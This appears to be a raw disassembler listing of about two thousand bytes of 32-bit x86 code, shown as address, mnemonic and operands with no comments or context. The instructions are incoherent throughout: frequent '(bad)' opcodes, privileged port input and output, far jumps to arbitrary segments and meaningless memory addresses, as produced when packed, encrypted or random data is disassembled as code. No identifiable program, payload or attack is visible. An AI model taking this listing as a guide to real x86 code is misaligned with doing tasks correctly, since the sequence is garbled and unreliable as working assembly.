  4038f8:	imul   edx,edi,0x2d90bfd4
  4038fe:	adc    al,0xed
  403900:	sub    eax,0x47c3f5be
  403905:	popf   
  403906:	clc    
  403907:	out    0xea,eax
  403909:	xchg   bl,al
  40390b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40390c:	add    al,0x8d
  40390e:	or     esi,ebx
  403910:	inc    eax
  403911:	jecxz  0x403904
  403913:	out    dx,al
  403914:	daa    
  403915:	(bad)  
  403916:	mov    al,0xf
  403918:	(bad)  [edi-0x2e5ee35e]
  40391e:	mov    eax,ds:0x6a86433e
  403923:	and    eax,DWORD PTR [ecx-0x12]
  403926:	ret    
  403927:	cmc    
  403928:	sbb    al,0x5d
  40392a:	pop    es
  40392b:	cmc    
  40392c:	mov    ebx,DWORD PTR [ebx+0x15]
  40392f:	jo     0x403966
  403931:	fs out dx,eax
  403933:	add    eax,0x99b94e12
  403938:	fucomi st,st(1)
  40393a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40393b:	leave  
  40393c:	mov    bl,cl
  40393e:	mov    dl,0x7d
  403940:	popa   
  403941:	(bad)  
  403942:	mov    ds:0xb79b0dfc,eax
  403947:	inc    esi
  403948:	jne    0x4038fe
  40394a:	mov    cl,0x15
  40394c:	jcxz   0x403998
  40394f:	pop    edx
  403950:	cmp    DWORD PTR [ecx-0x35aa0f2f],eax
  403956:	jg     0x403984
  403958:	test   eax,0x8f6fb8ad
  40395d:	sub    al,0x12
  40395f:	(bad)  
  403961:	ja     0x4039a5
  403963:	or     BYTE PTR [edx+0x3e24952e],cl
  403969:	outs   dx,BYTE PTR ds:[esi]
  40396a:	loopne 0x403900
  40396c:	les    ebp,FWORD PTR [ebx+ebx*1+0x74]
  403970:	pusha  
  403971:	and    bl,al
  403973:	cmp    eax,0x809a9cb
  403978:	cli    
  403979:	xor    BYTE PTR [edx+0x1a],0x61
  40397d:	or     ch,dl
  40397f:	repnz fstp st(2)
  403982:	cmp    ch,0xff
  403985:	sbb    BYTE PTR [ebx+0x3d],0x36
  403989:	es cmp al,0x21
  40398c:	int    0xf4
  40398e:	cs popa 
  403990:	or     DWORD PTR [edi],ebp
  403992:	aad    0x17
  403994:	mov    BYTE PTR [ecx+0x24],al
  403997:	inc    ebx
  403998:	cld    
  403999:	xor    al,0x22
  40399b:	adc    edx,DWORD PTR ds:0xfd38905b
  4039a1:	fimul  DWORD PTR [edx+0x61]
  4039a4:	add    bl,BYTE PTR [eax+0x4dbe0460]
  4039aa:	loope  0x403a0a
  4039ac:	pop    ss
  4039ad:	aaa    
  4039ae:	and    DWORD PTR gs:[edx],0x1237e1f0
  4039b5:	or     eax,0xfbfb4312
  4039ba:	fist   DWORD PTR [eax-0x4cec0351]
  4039c0:	fdivr  QWORD PTR [esi+edi*4]
  4039c3:	or     edx,DWORD PTR [ebp+0xe]
  4039c6:	mov    bh,0x78
  4039c8:	ins    BYTE PTR es:[edi],dx
  4039c9:	push   es
  4039ca:	xchg   DWORD PTR [ebx-0x683e67fa],esi
  4039d0:	out    0xc5,al
  4039d2:	fcmovu st,st(0)
  4039d4:	pop    ebx
  4039d5:	mov    dh,0xe3
  4039d7:	sbb    DWORD PTR [edx-0x6c],eax
  4039da:	cmp    BYTE PTR [edx],ah
  4039dc:	(bad)  
  4039dd:	bound  edi,QWORD PTR [edx-0x2185921d]
  4039e3:	and    eax,DWORD PTR [edi+edx*8+0x17]
  4039e7:	test   eax,0xc7d5c5b1
  4039ec:	cmp    al,0x95
  4039ee:	stos   DWORD PTR es:[edi],eax
  4039ef:	mov    dl,0xc9
  4039f1:	xchg   esp,eax
  4039f2:	sub    eax,0x427c3f59
  4039f7:	push   edi
  4039f8:	pop    ds
  4039f9:	push   ecx
  4039fa:	sbb    eax,0xfafb9d7e
  4039ff:	and    eax,0xdc444868
  403a04:	fiadd  WORD PTR [edx-0x53]
  403a07:	fnstenv [edx+0x7b5e647f]
  403a0d:	and    esi,DWORD PTR [esi]
  403a0f:	or     al,BYTE PTR [edx-0x2c]
  403a12:	leave  
  403a13:	out    0xa9,al
  403a15:	(bad)  
  403a16:	icebp  
  403a17:	xchg   ebx,eax
  403a18:	es or  eax,0x31b9a4e5
  403a1e:	mov    ecx,edx
  403a20:	lods   al,BYTE PTR ds:[esi]
  403a21:	mov    eax,ds:0xffdb0c71
  403a26:	sbb    dh,BYTE PTR [ebp-0x3c8482a8]
  403a2c:	stc    
  403a2d:	jno    0x403a58
  403a2f:	hlt    
  403a30:	cmc    
  403a31:	cmp    eax,0x415b66c8
  403a36:	push   eax
  403a37:	push   eax
  403a38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a39:	popf   
  403a3a:	adc    al,0x24
  403a3c:	icebp  
  403a3d:	cmp    ecx,DWORD PTR [esi+0x5274cc70]
  403a43:	fnsave [edx+0x5c]
  403a46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a47:	imul   ecx,esp,0x2d
  403a4a:	and    ch,BYTE PTR [esp+ebx*2+0x3965a87d]
  403a51:	ja     0x403a4b
  403a53:	daa    
  403a54:	leave  
  403a55:	xchg   edi,eax
  403a56:	mov    dl,0x76
  403a58:	aam    0x76
  403a5a:	popa   
  403a5b:	push   cs
  403a5c:	inc    esi
  403a5d:	out    0x30,al
  403a5f:	cs pop eax
  403a61:	shl    BYTE PTR [eax],1
  403a63:	call   0xccffa505
  403a68:	inc    edx
  403a69:	and    ah,BYTE PTR [ebp+0xa9f72d6]
  403a6f:	mov    cl,al
  403a71:	(bad)  
  403a72:	outs   dx,BYTE PTR ds:[esi]
  403a73:	push   edi
  403a74:	gs dec eax
  403a76:	push   0xa7518fd6
  403a7b:	push   eax
  403a7c:	jecxz  0x403a86
  403a7e:	imul   esi,ebp,0x93c12a0
  403a84:	test   BYTE PTR [ecx+ebp*8+0x5d],ah
  403a88:	fmul   QWORD PTR [ebp+0x38dcd410]
  403a8e:	imul   edi,DWORD PTR [ecx-0x57524598],0x6b
  403a95:	xlat   BYTE PTR ds:[ebx]
  403a96:	xor    edi,DWORD PTR [ecx]
  403a98:	inc    ecx
  403a99:	xchg   edi,eax
  403a9a:	popa   
  403a9b:	ror    DWORD PTR [esi-0x20ef866e],cl
  403aa1:	call   0x8dc6ce3f
  403aa6:	outs   dx,BYTE PTR ds:[esi]
  403aa7:	add    edi,eax
  403aa9:	sbb    DWORD PTR [eax-0x7ae84213],ebx
  403aaf:	xchg   ebp,eax
  403ab0:	fsub   DWORD PTR [ebp-0x7e]
  403ab3:	inc    ecx
  403ab4:	mov    edi,0x6b9bd319
  403ab9:	mov    bl,0xc6
  403abb:	pop    ebx
  403abc:	push   ebx
  403abd:	dec    ebx
  403abe:	ret    0xceba
  403ac1:	and    BYTE PTR [ecx-0x686ac1ae],al
  403ac7:	retf   0xe9bf
  403aca:	inc    edi
  403acc:	adc    DWORD PTR ss:[edx],esp
  403acf:	imul   ebp,DWORD PTR [eax],0x12c66bbe
  403ad5:	jmp    0x403a69
  403ad7:	mov    dl,0x55
  403ad9:	sti    
  403ada:	(bad)  
  403adc:	pushf  
  403add:	xor    BYTE PTR [esi-0x6bcf3b03],dh
  403ae3:	js     0x403b31
  403ae5:	mov    edx,ecx
  403ae7:	lods   eax,DWORD PTR ds:[esi]
  403ae8:	mov    edx,0xd89248f2
  403aed:	or     eax,0xda0c7fd7
  403af2:	or     BYTE PTR [edi-0x2c20575a],0xd6
  403af9:	not    BYTE PTR ds:0xd3afe0d0
  403aff:	fsub   DWORD PTR [ebx+0x57]
  403b02:	lahf   
  403b03:	cwde   
  403b04:	mov    edi,0xb4ecb3a6
  403b09:	xchg   al,bl
  403b0b:	pop    edi
  403b0c:	push   0xffffffd8
  403b0e:	in     al,0xf5
  403b10:	out    dx,eax
  403b11:	mov    dh,0x7d
  403b13:	sbb    ebx,edx
  403b15:	xor    eax,0x78bdae20
  403b1a:	jo     0x403ada
  403b1c:	mov    edi,0xf2899cce
  403b21:	out    0x6f,al
  403b23:	shr    ebp,cl
  403b25:	mov    dl,0x98
  403b27:	lods   al,BYTE PTR ds:[esi]
  403b28:	mov    ds,WORD PTR [edx]
  403b2a:	(bad)  
  403b2b:	fcmovnbe st,st(0)
  403b2d:	bound  edi,QWORD PTR [edx]
  403b2f:	xor    DWORD PTR [esi+ebp*2+0x1846ede4],eax
  403b36:	shr    BYTE PTR [ebp*2+0x19d8da5c],cl
  403b3d:	cwde   
  403b3e:	fdivr  DWORD PTR [esi+0x123ea585]
  403b44:	sbb    bl,bl
  403b46:	inc    ebx
  403b47:	js     0x403bc4
  403b49:	add    ebp,DWORD PTR [ebx-0x2a]
  403b4c:	imul   edi,DWORD PTR [edx+ebx*4],0x11
  403b50:	or     BYTE PTR [esp+edx*2+0x69],dh
  403b54:	(bad)  
  403b55:	lahf   
  403b56:	push   ss
  403b57:	fsubr  QWORD PTR [edx]
  403b59:	fdivr  QWORD PTR [edi-0x3e9a57e]
  403b5f:	test   DWORD PTR [edi+esi*4+0x6],edx
  403b63:	outs   dx,BYTE PTR ds:[esi]
  403b64:	jp     0xda5c04a6
  403b6a:	shl    DWORD PTR [edi-0x7f036cc5],cl
  403b70:	(bad)  
  403b71:	(bad)  
  403b72:	mov    ah,0x30
  403b74:	scas   eax,DWORD PTR es:[edi]
  403b75:	fistp  DWORD PTR [ebx+0x29fa9582]
  403b7b:	and    ah,BYTE PTR ds:0xd5fff135
  403b81:	xchg   DWORD PTR [ebx],esp
  403b83:	or     dl,BYTE PTR [eax+0x57afead8]
  403b89:	ret    0xf01c
  403b8c:	sbb    eax,0xc9a232c0
  403b91:	in     al,dx
  403b92:	in     eax,0x4b
  403b94:	xchg   edx,eax
  403b95:	cmp    dl,dh
  403b97:	mov    dl,0x68
  403b99:	clc    
  403b9a:	in     al,dx
  403b9b:	je     0x403b5a
  403b9d:	clc    
  403b9e:	ret    0xba2d
  403ba1:	retf   
  403ba2:	or     ch,BYTE PTR [edx]
  403ba4:	std    
  403ba5:	stos   BYTE PTR es:[edi],al
  403ba6:	mov    bl,0xff
  403ba8:	pop    esp
  403ba9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403baa:	clc    
  403bab:	iret   
  403bac:	ins    DWORD PTR es:[edi],dx
  403bad:	mov    ch,0xa
  403baf:	jno    0x403b3c
  403bb1:	xor    eax,0xce67a3f2
  403bb6:	inc    esp
  403bb7:	xlat   BYTE PTR ds:[ebx]
  403bb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bb9:	retf   
  403bba:	test   ecx,ebx
  403bbc:	mov    ecx,0xe5bcc98c
  403bc1:	popf   
  403bc2:	dec    edi
  403bc3:	inc    edi
  403bc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bc5:	rol    ecx,1
  403bc7:	lock ret 
  403bc9:	add    BYTE PTR [edi-0x25465a15],0x9f
  403bd0:	lods   eax,DWORD PTR ds:[esi]
  403bd1:	jge    0x403bbe
  403bd3:	ret    0x3aec
  403bd6:	mov    esp,0xf40c964e
  403bdb:	dec    edx
  403bdc:	or     eax,0x96aa05dd
  403be1:	xchg   ebp,eax
  403be2:	std    
  403be3:	(bad)  
  403be4:	xchg   ecx,eax
  403be5:	ds in  eax,dx
  403be7:	push   ecx
  403be8:	(bad)  
  403be9:	enter  0xa0a1,0xd9
  403bed:	retf   
  403bee:	mov    ecx,0x6a6cb198
  403bf3:	push   es
  403bf4:	xor    ecx,DWORD PTR [eax-0x508f07dc]
  403bfa:	or     ah,BYTE PTR [edi+0x63ad4e2]
  403c00:	jmp    0xdae68729
  403c05:	jge    0x403c0d
  403c07:	sbb    eax,0xf66fa058
  403c0c:	and    DWORD PTR [eax+0x19],0xea2adfa5
  403c13:	and    dh,cl
  403c15:	and    esp,DWORD PTR [ecx]
  403c17:	mov    eax,0x51e7f7e0
  403c1c:	aaa    
  403c1d:	xor    DWORD PTR [edx+0x71f9c6ee],ebp
  403c23:	sbb    ebx,edx
  403c25:	mov    cl,0xdc
  403c27:	fnstcw WORD PTR [ecx+edx*1+0x45351a70]
  403c2e:	sahf   
  403c2f:	xchg   esp,eax
  403c30:	push   ss
  403c31:	sbb    DWORD PTR [ecx+0x293544cb],0x6ed04fd
  403c3b:	cmp    DWORD PTR [esi+0x6fdc0d43],0x76
  403c42:	jmp    0xa03f65a7
  403c47:	adc    dh,BYTE PTR [edi+0x57]
  403c4a:	xchg   esp,eax
  403c4b:	scas   al,BYTE PTR es:[edi]
  403c4c:	jnp    0x403c82
  403c4e:	add    eax,0x92b77319
  403c53:	out    0xde,eax
  403c55:	es scas al,BYTE PTR es:[edi]
  403c57:	out    dx,al
  403c58:	les    ecx,FWORD PTR [ebp-0x3b7b3733]
  403c5e:	add    BYTE PTR [ebx+edx*4-0x23],ah
  403c62:	repnz hlt 
  403c64:	jg     0x403c38
  403c66:	inc    ecx
  403c67:	and    ecx,DWORD PTR gs:[edx-0x66]
  403c6b:	dec    eax
  403c6c:	loope  0x403c9e
  403c6e:	in     eax,dx
  403c6f:	mov    al,0x64
  403c71:	mov    ds:0x6de2da70,al
  403c76:	inc    esp
  403c77:	push   ds
  403c78:	loop   0x403cc8
  403c7a:	adc    al,0xd3
  403c7c:	or     esp,DWORD PTR [ebp-0x2b]
  403c7f:	popf   
  403c80:	and    esp,DWORD PTR [edx]
  403c82:	sbb    eax,0xa6111ce3
  403c87:	sbb    edi,DWORD PTR [edi]
  403c89:	pop    ss
  403c8a:	and    al,0xdd
  403c8c:	jmp    0x403ccc
  403c8e:	xchg   ebx,eax
  403c8f:	scas   al,BYTE PTR es:[edi]
  403c90:	sbb    al,0xf1
  403c92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c93:	cmp    DWORD PTR [edx+0x267e2d95],edi
  403c99:	sti    
  403c9a:	aad    0x48
  403c9c:	xor    eax,edi
  403c9e:	sub    eax,DWORD PTR es:[ecx+0x3d]
  403ca2:	inc    edx
  403ca3:	out    0xd4,eax
  403ca5:	pop    es
  403ca6:	ins    BYTE PTR es:[edi],dx
  403ca7:	push   0x57
  403ca9:	push   eax
  403caa:	mov    fs,WORD PTR [edx]
  403cac:	jae    0x403c40
  403cae:	and    BYTE PTR [edi+0x22],ch
  403cb1:	test   BYTE PTR [edi],bl
  403cb3:	push   0x176c85f
  403cb8:	dec    edi
  403cb9:	jge    0x403ca0
  403cbb:	cmp    al,0x9e
  403cbd:	hlt    
  403cbe:	push   ecx
  403cbf:	in     al,0x1a
  403cc1:	imul   DWORD PTR [eax-0x44]
  403cc4:	pop    ss
  403cc5:	cmp    esp,DWORD PTR [ebx+0x100ee6c2]
  403ccb:	repz icebp 
  403ccd:	out    0xe6,eax
  403ccf:	loopne 0x403d41
  403cd1:	xlat   BYTE PTR ds:[ebx]
  403cd2:	test   al,bl
  403cd4:	jmp    0x403cde
  403cd6:	call   0x8805:0xa011e321
  403cdd:	dec    esp
  403cde:	xchg   ecx,eax
  403cdf:	jb     0x403c90
  403ce1:	or     ecx,ebp
  403ce3:	ins    BYTE PTR es:[edi],dx
  403ce4:	push   0xffffffe9
  403ce6:	mov    ebx,ss
  403ce8:	xchg   ecx,eax
  403ce9:	cmp    eax,0xf2285f22
  403cee:	cmp    eax,0x96533d1f
  403cf3:	pop    edi
  403cf4:	aas    
  403cf5:	cdq    
  403cf6:	jle    0x403d11
  403cf8:	jno    0x403cff
  403cfa:	daa    
  403cfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cfc:	shl    BYTE PTR [edx-0x7f],cl
  403cff:	scas   eax,DWORD PTR es:[edi]
  403d00:	add    eax,0xcc41d228
  403d05:	sub    al,dh
  403d07:	leave  
  403d08:	(bad)  
  403d09:	adc    DWORD PTR [eax],ebx
  403d0b:	rcr    BYTE PTR [edx-0xddaecdc],cl
  403d11:	mov    eax,ds:0xf6bb4b72
  403d16:	inc    ebp
  403d17:	gs push ds
  403d19:	je     0x403cc1
  403d1b:	sbb    edx,DWORD PTR [edi+0x597aa139]
  403d21:	(bad)  
  403d22:	(bad)  
  403d23:	data16 sub dh,ah
  403d26:	sub    eax,0x62c4a46d
  403d2b:	mov    dl,0x1e
  403d2d:	test   BYTE PTR [ecx],bl
  403d2f:	adc    BYTE PTR [esi+0x3d],cl
  403d32:	arpl   WORD PTR [eax+0x7e],dx
  403d35:	cld    
  403d36:	scas   al,BYTE PTR es:[edi]
  403d37:	add    eax,0x4fdf4d44
  403d3c:	fdivrp st(5),st
  403d3e:	int3   
  403d3f:	or     eax,0x9faa9f40
  403d44:	push   ss
  403d45:	loop   0x403d5c
  403d47:	cmp    eax,0x84b8f103
  403d4c:	rcl    dh,cl
  403d4e:	add    edi,esi
  403d50:	sbb    DWORD PTR [eax+ecx*4-0x59],edx
  403d54:	push   ecx
  403d55:	leave  
  403d56:	mov    eax,ds:0x17f298bf
  403d5b:	outs   dx,DWORD PTR ds:[esi]
  403d5c:	xchg   ecx,eax
  403d5d:	int    0x28
  403d5f:	jb     0x403d35
  403d61:	out    0x19,al
  403d63:	mov    ch,0x37
  403d65:	cwde   
  403d66:	rcr    edi,1
  403d68:	push   edx
  403d69:	cli    
  403d6a:	icebp  
  403d6b:	lods   al,BYTE PTR ds:[esi]
  403d6c:	push   es
  403d6d:	mov    eax,0x3eb48de5
  403d72:	push   esi
  403d73:	add    edx,DWORD PTR ds:0xa7974f5a
  403d79:	xlat   BYTE PTR ds:[ebx]
  403d7a:	mov    cs,WORD PTR [edi-0x5be1e27f]
  403d80:	sub    DWORD PTR [edi+0x65454bd8],0xffffffb3
  403d87:	mov    ch,0xd2
  403d89:	sub    dh,al
  403d8b:	(bad)  
  403d8c:	push   edx
  403d8d:	mov    ch,0x19
  403d8f:	js     0x403e07
  403d91:	xchg   BYTE PTR [ebx],dl
  403d93:	lds    ecx,FWORD PTR ds:0x914df32d
  403d9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d9b:	sub    al,0x10
  403d9d:	or     ch,BYTE PTR [eax+0x4cd36dcd]
  403da3:	mov    WORD PTR [edx],?
  403da5:	xchg   edi,eax
  403da6:	fwait
  403da7:	cdq    
  403da8:	cwde   
  403da9:	inc    esp
  403daa:	in     eax,0x6c
  403dac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403dad:	clc    
  403dae:	les    edi,FWORD PTR [edi+eax*8+0x33a91347]
  403db5:	pop    DWORD PTR [ebp+0x512bd622]
  403dbb:	mov    eax,ds:0x5e6979de
  403dc0:	inc    edx
  403dc1:	cmc    
  403dc2:	adc    ecx,esi
  403dc4:	mov    ds:0x7bbd4443,al
  403dc9:	sub    BYTE PTR [ecx+eiz*8-0x3ac05bc7],cl
  403dd0:	xchg   BYTE PTR [edi+esi*8+0x50],cl
  403dd4:	cmp    ebp,edi
  403dd6:	scas   eax,DWORD PTR es:[edi]
  403dd7:	push   edx
  403dd8:	neg    al
  403dda:	or     ch,BYTE PTR [eax+0x5a2088f7]
  403de0:	inc    eax
  403de1:	push   cs
  403de2:	jp     0x403d9a
  403de4:	arpl   WORD PTR [ecx+0x10c587c2],si
  403dea:	pop    esi
  403deb:	add    al,0xfa
  403ded:	push   esp
  403dee:	dec    ecx
  403def:	sub    DWORD PTR [ebx+esi*8-0x1bdeaae9],ecx
  403df6:	rcl    DWORD PTR [esi-0x8],cl
  403df9:	push   ss
  403dfa:	out    0xd1,al
  403dfc:	xchg   edx,eax
  403dfd:	je     0x403e33
  403dff:	aaa    
  403e00:	in     eax,dx
  403e01:	cmp    eax,0x85f007e7
  403e06:	xchg   eax,eax
  403e08:	jecxz  0x403e1e
  403e0a:	jmp    0x1239:0xe30d14d7
  403e11:	mov    dl,0xad
  403e13:	call   0x7ca5:0x379a6f0c
  403e1a:	pop    ecx
  403e1b:	jmp    0x20dd:0x9cf2fdff
  403e22:	test   eax,0xf4b9075
  403e27:	ss std 
  403e29:	les    edx,FWORD PTR [ebx-0x6353e8a4]
  403e2f:	jmp    0x2e266141
  403e34:	ins    BYTE PTR es:[edi],dx
  403e35:	popf   
  403e36:	or     eax,0x6a7ec57
  403e3b:	sahf   
  403e3c:	mov    esi,0xd1f6c761
  403e41:	repz in eax,dx
  403e43:	inc    esp
  403e44:	inc    BYTE PTR [edi]
  403e46:	jmp    0x4748:0x90f6269a
  403e4d:	xor    DWORD PTR [ebx+eiz*2-0x17],0x64c62da5
  403e55:	jl     0x403e19
  403e57:	bound  eax,QWORD PTR [esi]
  403e59:	outs   dx,BYTE PTR ds:[esi]
  403e5a:	jno    0x403eca
  403e5c:	add    eax,0x94f5b17e
  403e61:	icebp  
  403e62:	inc    edi
  403e63:	and    esp,edx
  403e65:	dec    edi
  403e66:	hlt    
  403e67:	outs   dx,DWORD PTR ds:[esi]
  403e68:	mov    ch,0x4b
  403e6a:	pop    ebp
  403e6b:	int3   
  403e6c:	stc    
  403e6d:	push   ss
  403e6e:	cmc    
  403e6f:	sbb    DWORD PTR [esp+edi*8],edi
  403e72:	aaa    
  403e73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e74:	mov    cl,0x73
  403e76:	pop    ss
  403e77:	retf   
  403e78:	sub    eax,0x527a4386
  403e7d:	xchg   ecx,eax
  403e7e:	gs repz or al,0xb2
  403e82:	outs   dx,DWORD PTR ds:[esi]
  403e83:	pop    ds
  403e84:	jmp    0x1d2feb9a
  403e89:	je     0x403f01
  403e8b:	lock xor BYTE PTR [edi+0x176d284f],bl
  403e92:	mov    al,ds:0xabd03cda
  403e97:	int    0xb6
  403e99:	int3   
  403e9a:	push   esp
  403e9b:	xor    edx,ebp
  403e9d:	ds jmp 0xc5f00cf8
  403ea3:	or     DWORD PTR [eax],ecx
  403ea5:	xor    DWORD PTR [esi+ebx*1],esp
  403ea8:	or     ebp,ebx
  403eaa:	in     al,dx
  403eab:	ds ds pop ebx
  403eae:	mov    eax,ds:0x2a3d436c
  403eb3:	xchg   ecx,eax
  403eb5:	adc    eax,0x89910961
  403eba:	sub    eax,0x6fcb67be
  403ebf:	in     al,dx
  403ec0:	(bad)  
  403ec1:	fisttp QWORD PTR [ebp+0x78]
  403ec4:	xchg   edx,eax
  403ec5:	sti    
  403ec6:	mov    esi,ds
  403ec8:	sbb    BYTE PTR [di+0x2995],0x1c
  403ece:	adc    BYTE PTR [eax+0x7f454dc3],bh
  403ed4:	aam    0xb7
  403ed6:	inc    ebp
  403ed7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ed8:	nop
  403ed9:	loopne 0x403eea
  403edb:	mov    esp,0x83c59b85
  403ee0:	in     al,dx
  403ee1:	test   eax,0x81bfa4f8
  403ee6:	inc    edi
  403ee7:	jnp    0x403e98
  403ee9:	mov    edx,0x29baf897
  403eee:	mov    esp,0xe5f8661b
  403ef3:	dec    esp
  403ef4:	push   0x4a
  403ef6:	xchg   BYTE PTR [edx+eiz*4],dl
  403ef9:	jge    0x403f46
  403efb:	push   0xc6371358
  403f00:	push   edi
  403f01:	inc    edi
  403f02:	add    edx,DWORD PTR [ebx+0x307b1375]
  403f08:	push   ds
  403f09:	rol    BYTE PTR [eax-0x30],1
  403f0c:	jl     0x403f26
  403f0e:	cmc    
  403f0f:	dec    esi
  403f10:	dec    ebx
  403f11:	mov    eax,ds:0x38716364
  403f16:	je     0x403f69
  403f18:	mov    eax,ds:0xbb54461
  403f1d:	xchg   esi,eax
  403f1e:	mov    cl,0x88
  403f20:	test   al,0x6
  403f22:	nop
  403f23:	sti    
  403f24:	shl    BYTE PTR [edx-0x2a01df4a],1
  403f2a:	jl     0x403f68
  403f2c:	mov    edx,DWORD PTR [edi]
  403f2e:	push   es
  403f2f:	xor    eax,0xbaac5e7f
  403f34:	mov    DWORD PTR [edi+0x2b],esp
  403f37:	jo     0x403f37
  403f39:	push   esp
  403f3a:	push   0xdae4845b
  403f3f:	call   0x104:0x36f2bea0
  403f46:	jge    0x403f90
  403f48:	lods   al,BYTE PTR ds:[esi]
  403f49:	push   cs
  403f4a:	push   ecx
  403f4b:	icebp  
  403f4c:	add    BYTE PTR [ebx+0x48],dh
  403f4f:	rol    BYTE PTR [ebx-0x33],1
  403f52:	add    ebx,DWORD PTR [ebp+eiz*2+0x25ea3ce5]
  403f59:	push   0xffffffb8
  403f5b:	pusha  
  403f5c:	push   ds
  403f5d:	mov    DWORD PTR [edx],edx
  403f5f:	dec    esi
  403f60:	int3   
  403f61:	mov    al,ds:0x4be936bc
  403f66:	stos   DWORD PTR es:[edi],eax
  403f67:	ret    0x57b7
  403f6a:	jle    0x403f11
  403f6c:	js     0x403f04
  403f6e:	adc    ah,BYTE PTR [eax]
  403f70:	mov    ebx,0x43ac2e49
  403f75:	or     eax,0xf1cec5b
  403f7a:	shl    BYTE PTR [ecx],cl
  403f7c:	mov    al,ds:0x3ed03e7f
  403f81:	dec    ebp
  403f82:	in     al,dx
  403f83:	iret   
  403f84:	test   al,0xf8
  403f86:	mov    cl,0x1b
  403f88:	push   es
  403f89:	out    dx,eax
  403f8a:	popf   
  403f8b:	das    
  403f8c:	hlt    
  403f8d:	out    dx,eax
  403f8e:	mov    edi,0xec7df8d5
  403f93:	add    dl,al
  403f95:	arpl   WORD PTR [ebx+ecx*1-0x731fe6b5],cx
  403f9c:	push   edi
  403f9d:	jle    0x403f34
  403f9f:	mov    ebp,0xa67ab30e
  403fa4:	and    ch,BYTE PTR [edi]
  403fa6:	call   0x9504:0xfc80017c
  403fad:	mov    cl,0xbb
  403faf:	pop    esi
  403fb0:	(bad)  
  403fb1:	gs sti 
  403fb3:	shr    ebp,1
  403fb5:	mov    edx,DWORD PTR [edi+0x286e16cf]
  403fbb:	(bad)  
  403fbd:	jb     0x404017
  403fbf:	lds    edx,FWORD PTR [eax]
  403fc1:	and    dl,al
  403fc3:	push   esi
  403fc4:	int    0xec
  403fc6:	add    bl,BYTE PTR [ebx-0x47]
  403fc9:	dec    eax
  403fca:	dec    esi
  403fcb:	cmp    BYTE PTR [edi+0x38317e81],0x47
  403fd2:	cli    
  403fd3:	into   
  403fd4:	inc    ecx
  403fd5:	outs   dx,BYTE PTR ds:[esi]
  403fd6:	xchg   ebx,eax
  403fd7:	popf   
  403fd8:	pop    ebx
  403fd9:	mov    al,ds:0xf2fb92da
  403fde:	popf   
  403fdf:	mov    cl,0x16
  403fe1:	or     BYTE PTR [eax-0x4f],dh
  403fe4:	inc    esi
  403fe5:	xchg   esi,eax
  403fe6:	dec    edi
  403fe7:	xor    esi,DWORD PTR [ebx-0x6]
  403fea:	retf   
  403feb:	dec    eax
  403fec:	(bad)  [ebx-0x66a4ccd7]
  403ff2:	mov    ds:0x1aca9d98,eax
  403ff7:	jb     0x403ff6
  403ff9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ffa:	nop
  403ffb:	jnp    0x404050
  403ffd:	jle    0x404058
  403fff:	xor    al,0x78
  404001:	xchg   BYTE PTR [eax-0x4a],dl
  404004:	push   esp
  404005:	rcl    esi,0x2d
  404008:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404009:	pop    esp
  40400a:	lds    ebx,FWORD PTR [ebx-0x7df0fce2]
  404010:	jmp    0x2b77144d
  404015:	int3   
  404016:	lea    edx,[edi-0x13]
  404019:	xchg   ecx,eax
  40401a:	int    0x1c
  40401c:	test   al,0x21
  40401e:	xor    dh,BYTE PTR [edi-0x10]
  404021:	jb     0x404068
  404023:	les    esp,FWORD PTR [edi]
  404025:	cmc    
  404026:	inc    edx
  404027:	add    edx,DWORD PTR [eax+ebx*1]
  40402a:	repnz dec eax
  40402c:	cli    
  40402d:	pop    eax
  40402e:	adc    ebp,0xffffffe8
  404031:	cld    
  404032:	daa    
  404033:	sub    eax,0x21755427
  404038:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404039:	pop    edi
  40403a:	push   ebp
  40403b:	aam    0x91
  40403d:	xor    BYTE PTR [eax],dh
  40403f:	not    DWORD PTR [ebp+0x24]
  404042:	or     ah,ch
  404044:	cwde   
  404045:	fcmovbe st,st(0)
  404047:	pop    ecx
  404048:	scas   al,BYTE PTR es:[edi]
  404049:	stos   BYTE PTR es:[edi],al
  40404a:	dec    esi
  40404b:	pop    eax
  40404c:	dec    ebp
  40404d:	lock outs dx,BYTE PTR ds:[esi]
  40404f:	adc    BYTE PTR [esi+0x78debadb],0x9b
  404056:	xchg   DWORD PTR [ecx+esi*4+0x7e],ecx
  40405a:	pop    ss
  40405b:	test   BYTE PTR [ebx],al
  40405d:	and    eax,DWORD PTR [esi-0x38ac96b5]
  404063:	outs   dx,DWORD PTR ds:[esi]
  404064:	daa    
  404065:	push   edx
  404066:	cmp    eax,DWORD PTR [ebp+0x4d]
  404069:	fisubr DWORD PTR [ecx+0x1]
  40406c:	retf   
  40406d:	in     al,0x8d
  40406f:	out    dx,eax
  404070:	mov    ah,0x53
  404072:	cld    
  404073:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404074:	in     eax,dx
  404075:	imul   eax,DWORD PTR [edx+ecx*2],0x7ea636e
  40407c:	cdq    
  40407d:	loop   0x40403c
  40407f:	mov    ebp,0xe163a24e
  404084:	dec    edi
  404085:	mov    ds:0xd6b7279,eax
  40408a:	xor    edi,esp
  40408c:	js     0x404059
  40408e:	sub    al,0x31
  404090:	adc    DWORD PTR ds:0x305e3621,edx
  404096:	push   ebp
  404097:	out    dx,eax
  404098:	mov    esp,0xa0f75dc0
  40409d:	mov    bh,al
  40409f:	mov    edx,DWORD PTR ds:0x23b03433
  4040a5:	mov    eax,ds:0x27c0476b
  4040aa:	not    DWORD PTR [ebx+ebp*1+0x4c]
  4040ae:	jmp    0x6eafc4b7
  4040b3:	adc    esp,esi
